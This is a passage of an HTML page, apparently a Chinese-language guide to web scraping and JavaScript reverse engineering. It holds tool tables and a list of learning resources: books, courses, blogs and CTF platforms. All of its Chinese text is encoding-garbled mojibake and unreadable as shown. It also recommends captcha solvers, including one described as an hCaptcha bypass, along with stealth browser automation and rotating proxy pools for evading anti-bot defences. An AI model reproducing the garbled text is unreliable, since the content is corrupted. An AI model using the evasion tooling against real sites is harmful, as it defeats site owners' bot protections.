            <td>â€¢ æ³¨å…¥è‡ªå®šä¹‰ JavaScript<br>â€¢ è„šæœ¬å¸‚åœºï¼ˆGreasy Forkï¼‰<br>â€¢ è‡ªåŠ¨æ›´æ–°</td>
          </tr>
          <tr>
            <td><strong>EditThisCookie</strong></td>
            <td>-</td>
            <td>Chromeã€Firefox</td>
            <td>Cookie ç¼–è¾‘å·¥å…·</td>
            <td>â€¢ æŸ¥çœ‹/ç¼–è¾‘ Cookie<br>â€¢ å¯¼å…¥/å¯¼å‡º<br>â€¢ æœç´¢è¿‡æ»¤</td>
          </tr>
          <tr>
            <td><strong>JSON Viewer</strong></td>
            <td>-</td>
            <td>Chromeã€Firefox</td>
            <td>JSON æ ¼å¼åŒ–æµè§ˆå™¨æ’ä»¶</td>
            <td>â€¢ è¯­æ³•é«˜äº®<br>â€¢ æŠ˜å å±•å¼€<br>â€¢ æœç´¢è¿‡æ»¤</td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: æ³¨å…¥ Hook è„šæœ¬ã€ä¿®æ”¹é¡µé¢è¡Œä¸ºã€è‡ªåŠ¨åŒ–æ“ä½œã€Cookie è°ƒè¯•å’Œç®¡ç†</p>

      <hr />

      <h2 id="éªŒè¯ç è¯†åˆ«">éªŒè¯ç è¯†åˆ«</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦ç‰¹ç‚¹</th>
            <th>å®‰è£…å‘½ä»¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/sml2h3/ddddocr">ddddocr</a></strong></td>
            <td>9k+</td>
            <td>Python</td>
            <td>å¸¦å¸¦å¼Ÿå¼ŸOCRï¼Œç®€å•éªŒè¯ç è¯†åˆ«</td>
            <td>â€¢ æ— éœ€è®­ç»ƒ<br>â€¢ è¯†åˆ«å‡†ç¡®ç‡é«˜<br>â€¢ æ”¯æŒæ»‘å—ç¼ºå£æ£€æµ‹</td>
            <td><code>pip install ddddocr</code></td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/QIN2DIM/hcaptcha-challenger">hcaptcha-challenger</a></strong></td>
            <td>700+</td>
            <td>Python</td>
            <td>hCaptcha è‡ªåŠ¨è¯†åˆ«</td>
            <td>â€¢ åŸºäº YOLOv8<br>â€¢ è‡ªåŠ¨åŒ–æµç¨‹</td>
            <td><code>pip install hcaptcha-challenger</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: ç®€å•éªŒè¯ç è¯†åˆ«ã€hCaptcha ç»•è¿‡</p>

      <hr />

      <h2 id="å­¦ä¹ èµ„æºé¡¹ç›®">å­¦ä¹ èµ„æºé¡¹ç›®</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦å†…å®¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://github.com/lorien/awesome-web-scraping">awesome-web-scraping</a></strong></td>
            <td>7k+</td>
            <td>-</td>
            <td>Web çˆ¬è™«èµ„æºåˆé›†</td>
            <td>â€¢ çˆ¬è™«æ¡†æ¶<br>â€¢ ä»£ç†æœåŠ¡<br>â€¢ éªŒè¯ç è¯†åˆ«<br>â€¢ åçˆ¬è™«èµ„æº</td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/lydiahallie/javascript-questions">javascript-questions</a></strong>
            </td>
            <td>61k+</td>
            <td>å¤šè¯­è¨€</td>
            <td>JavaScript è¿›é˜¶é—®é¢˜é›†</td>
            <td>â€¢ æ¶µç›–é—­åŒ…ã€åŸå‹é“¾ã€å¼‚æ­¥ç­‰<br>â€¢ é€é¢˜è§£ç­”<br>â€¢ é€‚åˆé¢è¯•å‡†å¤‡</td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/getify/You-Dont-Know-JS">You-Dont-Know-JS</a></strong></td>
            <td>178k+</td>
            <td>è‹±æ–‡</td>
            <td>æ·±å…¥ç†è§£ JavaScript ç³»åˆ—ä¹¦ç±</td>
            <td>â€¢ ä½œç”¨åŸŸä¸é—­åŒ…<br>â€¢ this ä¸å¯¹è±¡åŸå‹<br>â€¢ å¼‚æ­¥ä¸æ€§èƒ½<br>â€¢ ES6+ ç‰¹æ€§</td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨åœºæ™¯</strong>: JavaScript åŸºç¡€åŠ å¼ºã€é¢è¯•å‡†å¤‡ã€æ·±å…¥ç†è§£ JavaScript</p>

      <hr />

      <h2 id="å…¶ä»–å®ç”¨å·¥å…·">å…¶ä»–å®ç”¨å·¥å…·</h2>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·åç§°</th>
            <th>Stars</th>
            <th>è¯­è¨€</th>
            <th>ç®€ä»‹</th>
            <th>ä¸»è¦åŠŸèƒ½</th>
            <th>è®¿é—®æ–¹å¼</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://www.postman.com/">Postman</a></strong></td>
            <td>-</td>
            <td>-</td>
            <td>API å¼€å‘å’Œæµ‹è¯•å·¥å…·</td>
            <td>â€¢ è¯·æ±‚æ„é€ <br>â€¢ é›†åˆç®¡ç†<br>â€¢ ç¯å¢ƒå˜é‡<br>â€¢ è‡ªåŠ¨åŒ–æµ‹è¯•</td>
            <td>å®˜ç½‘ä¸‹è½½</td>
          </tr>
          <tr>
            <td><strong><a href="https://github.com/jqlang/jq">jq</a></strong></td>
            <td>30k+</td>
            <td>C</td>
            <td>å‘½ä»¤è¡Œ JSON å¤„ç†å™¨</td>
            <td>â€¢ å¼ºå¤§çš„è¿‡æ»¤å’Œè½¬æ¢<br>â€¢ ç®¡é“æ“ä½œ<br>â€¢ è½»é‡çº§</td>
            <td><code>brew install jq</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># jq å¤„ç† JSON</span>
curl<span class="w"> </span>https://api.example.com/data<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span><span class="s1">&#39;.items[] | .name&#39;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å·¥å…·ç»„åˆæ–¹æ¡ˆ">å·¥å…·ç»„åˆæ–¹æ¡ˆ</h2>

      <h3 id="æ–¹æ¡ˆä¸€å…¨æ ˆçˆ¬è™«">æ–¹æ¡ˆä¸€ï¼šå…¨æ ˆçˆ¬è™«</h3>

      <pre><code>Puppeteer + puppeteer-extra-plugin-stealth
    â†“
mitmproxyï¼ˆæŠ“åŒ…åˆ†æï¼‰
    â†“
Babelï¼ˆåæ··æ·†ï¼‰
    â†“
Python requests/httpxï¼ˆè¯·æ±‚å¤ç°ï¼‰
</code></pre>

      <h3 id="æ–¹æ¡ˆäºŒé«˜æ€§èƒ½çˆ¬è™«">æ–¹æ¡ˆäºŒï¼šé«˜æ€§èƒ½çˆ¬è™«</h3>

      <pre><code>Scrapyï¼ˆæ¡†æ¶ï¼‰
    â†“
Scrapy-Redisï¼ˆåˆ†å¸ƒå¼ï¼‰
    â†“
ä»£ç†æ± ï¼ˆIP è½®æ¢ï¼‰
    â†“
æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆä»»åŠ¡è°ƒåº¦ï¼‰
</code></pre>

      <h3 id="æ–¹æ¡ˆä¸‰javascript-é€†å‘">æ–¹æ¡ˆä¸‰ï¼šJavaScript é€†å‘</h3>

      <pre><code>Chrome DevToolsï¼ˆåŠ¨æ€è°ƒè¯•ï¼‰
    â†“
Babel + AST Explorerï¼ˆåæ··æ·†ï¼‰
    â†“
CyberChefï¼ˆæ•°æ®å¤„ç†ï¼‰
    â†“
Node.jsï¼ˆç®—æ³•å¤ç°ï¼‰
</code></pre>

      <hr />

      <h2 id="æŒç»­å…³æ³¨">æŒç»­å…³æ³¨</h2>

      <p>å»ºè®®å®šæœŸå…³æ³¨ä»¥ä¸‹èµ„æºï¼š</p>

      <table>
        <thead>
          <tr>
            <th>èµ„æºåç§°</th>
            <th>é“¾æ¥</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>GitHub Trending</strong></td>
            <td>https://github.com/trending/javascript</td>
            <td>å‘ç°çƒ­é—¨é¡¹ç›®</td>
          </tr>
          <tr>
            <td><strong>Awesome Lists</strong></td>
            <td>https://github.com/sindresorhus/awesome</td>
            <td>ä¼˜è´¨èµ„æºåˆé›†</td>
          </tr>
          <tr>
            <td><strong>Reddit</strong></td>
            <td>r/webscraping</td>
            <td>ç¤¾åŒºè®¨è®º</td>
          </tr>
          <tr>
            <td><strong>Stack Overflow</strong></td>
            <td>æ ‡ç­¾ <code>web-scraping</code></td>
            <td>æŠ€æœ¯é—®ç­”</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#11-Resources-learning-resources">å­¦ä¹ èµ„æº</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#02-Tooling-puppeteer-playwright">Puppeteer ä¸ Playwright</a></li>
        <li><a href="#02-Tooling-ast-tools">AST è§£æå·¥å…·</a></li>
      </ul>

    </div>

    <div class="section" id="11-Resources-learning-resources">
      <h2>82. Learning Resources</h2>
      <h1 id="å­¦ä¹ èµ„æº">å­¦ä¹ èµ„æº</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æœ¬ç« æ±‡æ€»äº† Web é€†å‘å·¥ç¨‹é¢†åŸŸçš„ä¼˜è´¨å­¦ä¹ èµ„æºï¼ŒåŒ…æ‹¬ä¹¦ç±ã€è¯¾ç¨‹ã€åšå®¢ã€è§†é¢‘ã€ç»ƒä¹ å¹³å°ç­‰ï¼Œå¸®åŠ©ä½ ç³»ç»ŸåŒ–å­¦ä¹ å¹¶ä¸æ–­æå‡æŠ€èƒ½ã€‚</p>

      <hr />

      <h2 id="ä¹¦ç±æ¨è">ä¹¦ç±æ¨è</h2>

      <h3 id="web-å¼€å‘ä¸-javascript">Web å¼€å‘ä¸ JavaScript</h3>

      <table>
        <thead>
          <tr>
            <th>ä¹¦å</th>
            <th>ä½œè€…</th>
            <th>éš¾åº¦</th>
            <th>æ¨èæŒ‡æ•°</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>é€‚åˆäººç¾¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>JavaScript é«˜çº§ç¨‹åºè®¾è®¡ï¼ˆç¬¬4ç‰ˆï¼‰</strong></td>
            <td>Matt Frisbie</td>
            <td>â­â­â­</td>
            <td>â­â­â­â­â­</td>
            <td>â€¢ JavaScript æ ¸å¿ƒè¯­æ³•<br>â€¢ DOM æ“ä½œ<br>â€¢ BOM å¯¹è±¡<br>â€¢ å¼‚æ­¥ç¼–ç¨‹<br>â€¢ é¢å‘å¯¹è±¡ç¼–ç¨‹</td>
            <td>å‰ç«¯åŸºç¡€å…¥é—¨</td>
          </tr>
          <tr>
            <td><strong>ä½ ä¸çŸ¥é“çš„ JavaScriptï¼ˆä¸Šã€ä¸­ã€ä¸‹å·ï¼‰</strong></td>
            <td>Kyle Simpson</td>
            <td>â­â­â­â­</td>
            <td>â­â­â­â­â­</td>
            <td>â€¢ ä½œç”¨åŸŸä¸é—­åŒ…<br>â€¢ this ä¸å¯¹è±¡åŸå‹<br>â€¢ ç±»å‹ä¸è¯­æ³•<br>â€¢ å¼‚æ­¥ä¸æ€§èƒ½<br>â€¢ ES6 åŠæ›´æ–°ç‰¹æ€§</td>
            <td>JavaScript è¿›é˜¶å­¦ä¹ </td>
          </tr>
          <tr>
            <td><strong>JavaScript å¿è€…ç§˜ç±ï¼ˆç¬¬2ç‰ˆï¼‰</strong></td>
            <td>John Resigï¼ˆjQuery ä½œè€…ï¼‰</td>
            <td>â­â­â­â­</td>
            <td>â­â­â­â­</td>
            <td>â€¢ å‡½æ•°å¼ç¼–ç¨‹<br>â€¢ é—­åŒ…ä¸ä½œç”¨åŸŸ<br>â€¢ åŸå‹ä¸ç»§æ‰¿<br>â€¢ æ­£åˆ™è¡¨è¾¾å¼</td>
            <td>JavaScript æ·±å…¥ç†è§£</td>
          </tr>
        </tbody>
      </table>

      <p><strong>åœ¨çº¿èµ„æº</strong>:</p>

      <ul>
        <li>ã€Šä½ ä¸çŸ¥é“çš„ JavaScriptã€‹åœ¨çº¿ç‰ˆ: https://github.com/getify/You-Dont-Know-JS</li>
      </ul>

      <hr />

      <h3 id="http-ä¸ç½‘ç»œåè®®">HTTP ä¸ç½‘ç»œåè®®</h3>

      <table>
        <thead>
          <tr>
            <th>ä¹¦å</th>
            <th>ä½œè€…</th>
            <th>éš¾åº¦</th>
            <th>æ¨èæŒ‡æ•°</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>é€‚åˆäººç¾¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>å›¾è§£ HTTP</strong></td>
            <td>ä¸Šé‡å®£</td>
            <td>â­â­</td>
            <td>â­â­â­â­â­</td>
            <td>â€¢ HTTP åè®®åŸºç¡€<br>â€¢ è¯·æ±‚ä¸å“åº”<br>â€¢ HTTP æ–¹æ³•<br>â€¢ çŠ¶æ€ç <br>â€¢ HTTPS ä¸ SSL/TLS</td>
            <td>ç½‘ç»œåè®®å…¥é—¨</td>
          </tr>
          <tr>
            <td><strong>HTTP æƒå¨æŒ‡å—</strong></td>
            <td>David Gourley, Brian Totty</td>
            <td>â­â­â­</td>
            <td>â­â­â­â­</td>
            <td>â€¢ HTTP å®Œæ•´è§„èŒƒ<br>â€¢ ç¼“å­˜æœºåˆ¶<br>â€¢ ä»£ç†ä¸ç½‘å…³<br>â€¢ Web å®‰å…¨</td>
            <td>HTTP æ·±å…¥å­¦ä¹ </td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="é€†å‘å·¥ç¨‹ä¸å®‰å…¨">é€†å‘å·¥ç¨‹ä¸å®‰å…¨</h3>

      <table>
        <thead>
          <tr>
            <th>ä¹¦å</th>
            <th>ä½œè€…</th>
            <th>éš¾åº¦</th>
            <th>æ¨èæŒ‡æ•°</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>é€‚åˆäººç¾¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Web å®‰å…¨æ·±åº¦å‰–æ</strong></td>
            <td>å¼ ç‚³å¸…</td>
            <td>â­â­â­â­</td>
            <td>â­â­â­â­</td>
            <td>â€¢ XSS/CSRF/SQL æ³¨å…¥<br>â€¢ åŠ å¯†ä¸è®¤è¯<br>â€¢ ä»£ç æ··æ·†<br>â€¢ åçˆ¬è™«æŠ€æœ¯</td>
            <td>Web å®‰å…¨å…¥é—¨</td>
          </tr>
          <tr>
            <td><strong>ç™½å¸½å­è®² Web å®‰å…¨</strong></td>
            <td>å´ç¿°æ¸…</td>
            <td>â­â­â­</td>
            <td>â­â­â­â­â­</td>
            <td>â€¢ å¸¸è§ Web æ¼æ´<br>â€¢ å®‰å…¨é˜²æŠ¤<br>â€¢ æ¸—é€æµ‹è¯•<br>â€¢ åº”ç”¨å®‰å…¨</td>
            <td>Web å®‰å…¨åŸºç¡€</td>
          </tr>
          <tr>
            <td><strong>åŠ å¯†ä¸è§£å¯†ï¼ˆç¬¬4ç‰ˆï¼‰</strong></td>
            <td>æ®µé’¢</td>
            <td>â­â­â­â­â­</td>
            <td>â­â­â­â­</td>
            <td>â€¢ é€†å‘å·¥ç¨‹åŸºç¡€<br>â€¢ åŠ å¯†ç®—æ³•<br>â€¢ ä»£ç ä¿æŠ¤<br>â€¢ åè°ƒè¯•æŠ€æœ¯</td>
            <td>é€†å‘å·¥ç¨‹è¿›é˜¶</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="python-çˆ¬è™«">Python çˆ¬è™«</h3>

      <table>
        <thead>
          <tr>
            <th>ä¹¦å</th>
            <th>ä½œè€…</th>
            <th>éš¾åº¦</th>
            <th>æ¨èæŒ‡æ•°</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>é€‚åˆäººç¾¤</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Python ç½‘ç»œçˆ¬è™«æƒå¨æŒ‡å—</strong></td>
            <td>Ryan Mitchell</td>
            <td>â­â­â­</td>
            <td>â­â­â­â­</td>
            <td>â€¢ çˆ¬è™«åŸºç¡€<br>â€¢ BeautifulSoup/Scrapy<br>â€¢ JavaScript æ¸²æŸ“<br>â€¢ åçˆ¬è™«å¯¹æŠ—</td>
            <td>Python çˆ¬è™«å…¥é—¨</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="åœ¨çº¿è¯¾ç¨‹">åœ¨çº¿è¯¾ç¨‹</h2>

      <h3 id="ç»¼åˆå¹³å°">ç»¼åˆå¹³å°</h3>

      <table>
        <thead>
          <tr>
            <th>å¹³å°</th>
            <th>ç½‘å€</th>
            <th>æ¨èè¯¾ç¨‹</th>
            <th>ç‰¹ç‚¹</th>
            <th>ä»·æ ¼</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Udemy</strong></td>
            <td>https://www.udemy.com/</td>
            <td>â€¢ The Complete Web Developer Course<br>â€¢ JavaScript: Understanding the Weird Parts<br>â€¢ Web Scraping
              with Python</td>
            <td>â€¢ ç»å¸¸æ‰“æŠ˜ï¼ˆ10-20ç¾å…ƒï¼‰<br>â€¢ ç»ˆèº«è®¿é—®<br>â€¢ ä¸­è‹±æ–‡å­—å¹•</td>
            <td>$10-20ï¼ˆæ‰“æŠ˜æ—¶ï¼‰</td>
          </tr>
          <tr>
            <td><strong>Coursera</strong></td>
            <td>https://www.coursera.org/</td>
            <td>â€¢ Web Design for Everybody (å¯†æ­‡æ ¹å¤§å­¦)<br>â€¢ CS50&#8217;s Web Programming (å“ˆä½›å¤§å­¦)</td>
            <td>â€¢ é¡¶å°–å¤§å­¦è¯¾ç¨‹<br>â€¢ è®¤è¯è¯ä¹¦<br>â€¢ éƒ¨åˆ†è¯¾ç¨‹å…è´¹æ—å¬</td>
            <td>å…è´¹æ—å¬ / $49/æœˆ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="ä¸­æ–‡å¹³å°">ä¸­æ–‡å¹³å°</h3>

      <table>
        <thead>
          <tr>
            <th>å¹³å°</th>
            <th>ç½‘å€</th>
            <th>æ¨èè¯¾ç¨‹/ä¸“æ </th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ…•è¯¾ç½‘</strong></td>
            <td>https://www.imooc.com/</td>
            <td>â€¢ å‰ç«¯ JavaScript è¿›é˜¶<br>â€¢ Python çˆ¬è™«å·¥ç¨‹å¸ˆ<br>â€¢ Web å®‰å…¨å·¥ç¨‹å¸ˆ</td>
            <td>å®æˆ˜é¡¹ç›®å¯¼å‘</td>
          </tr>
          <tr>
            <td><strong>æå®¢æ—¶é—´</strong></td>
            <td>https://time.geekbang.org/</td>
            <td>â€¢ æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ<br>â€¢ JavaScript æ ¸å¿ƒåŸç†è§£æ<br>â€¢ ç½‘ç»œåè®®æ”»ç•¥</td>
            <td>æ·±åº¦æŠ€æœ¯æ–‡ç« </td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="åšå®¢ä¸æ–‡ç« ">åšå®¢ä¸æ–‡ç« </h2>

      <h3 id="æŠ€æœ¯åšå®¢">æŠ€æœ¯åšå®¢</h3>

      <table>
        <thead>
          <tr>
            <th>åšå®¢åç§°</th>
            <th>ç½‘å€</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>å¾çˆ±ç ´è§£è®ºå›</strong></td>
            <td>https://www.52pojie.cn/</td>
            <td>é€†å‘å·¥ç¨‹ã€è½¯ä»¶ç ´è§£ã€åæ··æ·†æŠ€æœ¯</td>
            <td>ä¸­æ–‡ç¤¾åŒºã€å®æˆ˜æ¡ˆä¾‹ä¸°å¯Œ</td>
          </tr>
          <tr>
            <td><strong>çœ‹é›ªè®ºå›</strong></td>
            <td>https://bbs.kanxue.com/</td>
            <td>äºŒè¿›åˆ¶é€†å‘ã€åŠ å¯†ç®—æ³•ã€å®‰å…¨ç ”ç©¶</td>
            <td>ä¸“ä¸šæ·±åº¦ã€é«˜è´¨é‡è®¨è®º</td>
          </tr>
          <tr>
            <td><strong>å…ˆçŸ¥ç¤¾åŒº</strong></td>
            <td>https://xz.aliyun.com/</td>
            <td>Web å®‰å…¨ã€æ¸—é€æµ‹è¯•ã€æ¼æ´åˆ†æ</td>
            <td>é˜¿é‡Œäº‘å®˜æ–¹ã€å®‰å…¨èµ„è®¯</td>
          </tr>
          <tr>
            <td><strong>ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ</strong></td>
            <td>https://tech.meituan.com/</td>
            <td>å‰ç«¯å®‰å…¨ç³»åˆ—ã€JavaScript æ€§èƒ½ä¼˜åŒ–</td>
            <td>å¤§å‚å®æˆ˜ç»éªŒ</td>
          </tr>
          <tr>
            <td><strong>é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—</strong></td>
            <td>https://www.ruanyifeng.com/blog/</td>
            <td>JavaScript æ•™ç¨‹ã€ES6 å…¥é—¨ã€HTTP åè®®</td>
            <td>é€šä¿—æ˜“æ‡‚ã€å®šæœŸæ›´æ–°</td>
          </tr>
          <tr>
            <td><strong>å¼ é‘«æ—­çš„åšå®¢</strong></td>
            <td>https://www.zhangxinxu.com/</td>
            <td>CSSã€JavaScriptã€Web å‰ç«¯</td>
            <td>æ·±åº¦åŸåˆ›ã€å®ç”¨æŠ€å·§</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="å›½å¤–ä¼˜è´¨åšå®¢">å›½å¤–ä¼˜è´¨åšå®¢</h3>

      <table>
        <thead>
          <tr>
            <th>åšå®¢åç§°</th>
            <th>ç½‘å€</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Martin Fowler</strong></td>
            <td>https://martinfowler.com/</td>
            <td>è½¯ä»¶æ¶æ„ã€è®¾è®¡æ¨¡å¼</td>
            <td>è¡Œä¸šæƒå¨</td>
          </tr>
          <tr>
            <td><strong>CSS-Tricks</strong></td>
            <td>https://css-tricks.com/</td>
            <td>å‰ç«¯å¼€å‘æŠ€å·§</td>
            <td>å®ç”¨æ•™ç¨‹</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="è§†é¢‘æ•™ç¨‹">è§†é¢‘æ•™ç¨‹</h2>

      <h3 id="youtube-é¢‘é“">YouTube é¢‘é“</h3>

      <table>
        <thead>
          <tr>
            <th>é¢‘é“åç§°</th>
            <th>ç½‘å€</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Traversy Media</strong></td>
            <td>https://www.youtube.com/@TraversyMedia</td>
            <td>Web å¼€å‘ã€JavaScriptã€Python</td>
            <td>å®æˆ˜é¡¹ç›®ã€åˆå­¦è€…å‹å¥½</td>
          </tr>
          <tr>
            <td><strong>The Net Ninja</strong></td>
            <td>https://www.youtube.com/@NetNinja</td>
            <td>å‰ç«¯æ¡†æ¶ã€Node.jsã€æ•°æ®åº“</td>
            <td>ç³»åˆ—æ•™ç¨‹ã€å¾ªåºæ¸è¿›</td>
          </tr>
          <tr>
            <td><strong>John Hammond</strong></td>
            <td>https://www.youtube.com/@_JohnHammond</td>
            <td>CTFã€é€†å‘å·¥ç¨‹ã€ç½‘ç»œå®‰å…¨</td>
            <td>CTF é¢˜è§£ã€å®æˆ˜æ¼”ç¤º</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="ä¸­æ–‡è§†é¢‘bç«™">ä¸­æ–‡è§†é¢‘ï¼ˆBç«™ï¼‰</h3>

      <table>
        <thead>
          <tr>
            <th>UP ä¸»</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>å°šç¡…è°·</strong></td>
            <td>å‰ç«¯/åç«¯ç³»ç»Ÿè¯¾ç¨‹</td>
            <td>å®Œæ•´è¯¾ç¨‹ä½“ç³»</td>
          </tr>
          <tr>
            <td><strong>coderwhy</strong></td>
            <td>å‰ç«¯è¿›é˜¶æ•™ç¨‹</td>
            <td>Vue/React æ·±åº¦è®²è§£</td>
          </tr>
          <tr>
            <td><strong>æŠ€æœ¯è›‹è€å¸ˆ</strong></td>
            <td>çˆ¬è™«ä¸é€†å‘</td>
            <td>å®æˆ˜å¯¼å‘</td>
          </tr>
          <tr>
            <td><strong>å´”åº†æ‰ä¸¨é™è§…</strong></td>
            <td>Python çˆ¬è™«ä¸“å®¶</td>
            <td>çˆ¬è™«å…¨æ ˆæ•™ç¨‹</td>
          </tr>
        </tbody>
      </table>

      <p><strong>ç‰¹ç‚¹</strong>: å…è´¹é«˜è´¨é‡ã€å¼¹å¹•äº’åŠ¨</p>

      <hr />

      <h2 id="ç»ƒä¹ å¹³å°">ç»ƒä¹ å¹³å°</h2>

      <h3 id="ctf-å¹³å°">CTF å¹³å°</h3>

      <table>
        <thead>
          <tr>
            <th>å¹³å°åç§°</th>
            <th>ç½‘å€</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>éš¾åº¦</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>BUUCTF</strong></td>
            <td>https://buuoj.cn/</td>
            <td>Webã€é€†å‘ã€PWNã€å¯†ç å­¦</td>
            <td>â­â­</td>
            <td>ä¸­æ–‡ç•Œé¢ã€é¢˜ç›®ä¸°å¯Œã€é€‚åˆæ–°æ‰‹</td>
          </tr>
          <tr>
            <td><strong>CTFHub</strong></td>
            <td>https://www.ctfhub.com/</td>
            <td>Web å®‰å…¨æŠ€èƒ½æ ‘</td>
            <td>â­â­â­</td>
            <td>ç³»ç»ŸåŒ–å­¦ä¹ è·¯å¾„</td>
          </tr>
          <tr>
            <td><strong>picoCTF</strong></td>
            <td>https://picoctf.org/</td>
            <td>é¢å‘åˆå­¦è€…çš„ CTF</td>
            <td>â­â­</td>
            <td>æ•™è‚²å¯¼å‘ã€é€æ­¥æå‡</td>
          </tr>
          <tr>
            <td><strong>Hack The Box</strong></td>
            <td>https://www.hackthebox.com/</td>
            <td>æ¸—é€æµ‹è¯•ã€é€†å‘å·¥ç¨‹</td>
            <td>â­â­â­â­</td>
            <td>çœŸå®ç¯å¢ƒã€å›½é™…çŸ¥å</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="javascript-ç»ƒä¹ ">JavaScript ç»ƒä¹ </h3>

      <table>
        <thead>
          <tr>
            <th>å¹³å°åç§°</th>
            <th>ç½‘å€</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>JavaScript30</strong></td>
            <td>https://javascript30.com/</td>
            <td>30 ä¸ªçº¯ JavaScript é¡¹ç›®</td>
            <td>å…è´¹ã€æ— æ¡†æ¶ã€å®æˆ˜å¯¼å‘</td>
          </tr>
          <tr>
            <td><strong>Codewars</strong></td>
            <td>https://www.codewars.com/</td>
            <td>ç®—æ³•é¢˜åº“ï¼ˆå¤šè¯­è¨€ï¼‰</td>
            <td>æ¸¸æˆåŒ–ã€ç¤¾åŒºè®¨è®º</td>
          </tr>
          <tr>
            <td><strong>LeetCode</strong></td>
            <td>https://leetcode.com/</td>
            <td>ç®—æ³•ä¸æ•°æ®ç»“æ„</td>
            <td>é¢è¯•å¿…å¤‡ã€ä¸­è‹±æ–‡ç‰ˆæœ¬</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="çˆ¬è™«å®æˆ˜">çˆ¬è™«å®æˆ˜</h3>

      <table>
        <thead>
          <tr>
            <th>èµ„æºåç§°</th>
            <th>ç½‘å€</th>
            <th>å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Scrapy å®˜æ–¹æ•™ç¨‹</strong></td>
            <td>https://docs.scrapy.org/en/latest/intro/tutorial.html</td>
            <td>Scrapy æ¡†æ¶ä½¿ç”¨</td>
            <td>å®˜æ–¹æ–‡æ¡£ã€ç¤ºä¾‹å®Œæ•´</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å·¥å…·æ–‡æ¡£">å·¥å…·æ–‡æ¡£</h2>

      <h3 id="æµè§ˆå™¨è‡ªåŠ¨åŒ–">æµè§ˆå™¨è‡ªåŠ¨åŒ–</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>å®˜æ–¹æ–‡æ¡£</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Puppeteer</strong></td>
            <td>https://pptr.dev/</td>
            <td>API å®Œæ•´ã€ç¤ºä¾‹ä¸°å¯Œ</td>
          </tr>
          <tr>
            <td><strong>Playwright</strong></td>
            <td>https://playwright.dev/</td>
